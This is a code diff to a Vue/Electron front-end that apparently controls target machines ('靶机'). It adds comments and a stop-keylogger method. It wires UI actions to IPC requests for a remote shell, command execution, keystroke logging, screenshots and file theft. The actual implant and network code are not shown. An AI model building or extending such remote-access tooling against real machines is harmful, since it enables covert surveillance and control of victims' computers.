@@ -88,7 +88,7 @@ let tableDATA = [{
 export default {
   data () {
     return {
-      menus: ['刷新列表','屏幕截图', '键盘记录', '文件目录', '断开连接'],
+      menus: ['刷新列表', '屏幕截图', '键盘记录', '文件目录', '断开连接'],
       tableData: tableDATA,
       currentRowIndex: 0
     }
@@ -123,65 +123,117 @@ export default {
         // todo 断开连接
       }
     },
+    /**
+     * @description: 更新当前靶机
+     * @param {string} newUuid 当前target索引
+     * @return {type} 返回成功改变的uuid
+     */
     changeCurrentTarget (newUuid) {
       ipcRenderer.once('currentTargetChanged', (event, packet) => {
         console.log(`new target uuid ${packet}`)
       })
       ipcRenderer.send('setCurrentTarget', newUuid)
     },
+    /**
+     * @description: 更新靶机列表
+     * @return {json}  targetList 靶机列表
+     */
     updateTargetList () {
-      ipcRenderer.once('updateTargetList', (event, packet) => {
-        console.log(JSON.stringify(packet))
-        console.log(packet[0].uuid)
-        this.changeCurrentTarget(packet[0].uuid)
+      ipcRenderer.once('updateTargetList', (event, targetList) => {
+        console.log(JSON.stringify(targetList))
+        console.log(targetList[0].uuid)
+        this.changeCurrentTarget(targetList[0].uuid)
       })
       ipcRenderer.send('requestTargetList')
     },
+    /**
+     * @description: 请求shell
+     * @return {boolean} status shell连接状态
+     */
     requestShell () {
-      ipcRenderer.once('getShell', (event, packet) => {
-        alert('Vue:' + packet)
+      ipcRenderer.once('getShell', (event, status) => {
+        alert('Vue:' + status)
       })
       ipcRenderer.send('requestShell', 'start')
     },
+    /**
+     * @description: 请求断开shell
+     * @return {boolean} status shell连接状态
+     */
     stopShell () {
-      ipcRenderer.once('stopShell', (event, packet) => {
-        alert('Vue:' + packet)
+      ipcRenderer.once('stopShell', (event, status) => {
+        alert('Vue:' + status)
       })
       ipcRenderer.send('requestShell', 'stop')
     },
+    /**
+     * @description: 请求键盘更新
+     * @return {string} stream 新增的键盘输入
+     */
     requestKeylogger () {
-      ipcRenderer.once('updateKeylogger', (event, packet) => {
-        alert('Vue:' + packet)
+      ipcRenderer.once('updateKeylogger', (event, stream) => {
+        alert('Vue:' + stream)
       })
       ipcRenderer.send('requestKeylogger', 'start')
     },
+    /**
+     * @description: 断开键盘更新
+     * @return {string} res 断开键盘监控提示
+     */
+    stopKeylogger () {
+      ipcRenderer.once('keyloggerStop', (event, res) => {
+        alert('Vue:' + res)
+      })
+      ipcRenderer.send('requestKeylogger', 'stop')
+    },
+    /**
+     * @description: 断开靶机连接
+     * @return {string} status 靶机断开回复
+     */
     disconnectTarget () {
-      ipcRenderer.once('disconnected', (event, packet) => {
-        alert('Vue:' + packet)
+      ipcRenderer.once('disconnected', (event, status) => {
+        alert('Vue:' + status)
       })
       ipcRenderer.send('disconnect')
     },
+    /**
+     * @description: 获取屏幕截图
+     * @return {string} url 屏幕截图保存路径
+     */
     getScreenShot () {
-      ipcRenderer.once('ScreenShot', (event, packet) => {
-        alert('截图保存在' + packet)
+      ipcRenderer.once('ScreenShot', (event, url) => {
+        alert('截图保存在' + url)
       })
       ipcRenderer.send('requestScreenShot')
     },
+    /**
+     * @description: 获取文件
+     * @return {string} url 文件保存路径
+     */
     getFile (path) {
-      ipcRenderer.once('transfile', (event, packet) => {
-        alert('文件保存在' + packet)
+      ipcRenderer.once('transfile', (event, url) => {
+        alert('文件保存在' + url)
       })
       ipcRenderer.send('requestFile', path)
     },
+    /**
+     * @description: 求取文件预览目录
+     * @return {undefined} filePreview 文件预览目录
+     */
     requestFilePreview () {
-      ipcRenderer.once('filepreview', (event, packet) => {
-        alert('Vue:' + packet)
+      ipcRenderer.once('filepreview', (event, filePreview) => {
+        alert('Vue:' + filePreview)
       })
       ipcRenderer.send('requestFilePreview')
     },
+    /**
+     * @description: 发送shell指令
+     * @param {string} commandLines 命令行
+     * @return {string} shell指令回复
+     */
     sendCommand (commandLines) {
-      ipcRenderer.once('commandSended', (event, packet) => {
-        alert('Vue:' + packet)
+      ipcRenderer.once('commandSended', (event, res) => {
+        alert('Vue:' + res)
       })
       ipcRenderer.send('sendCommand', commandLines)
     },
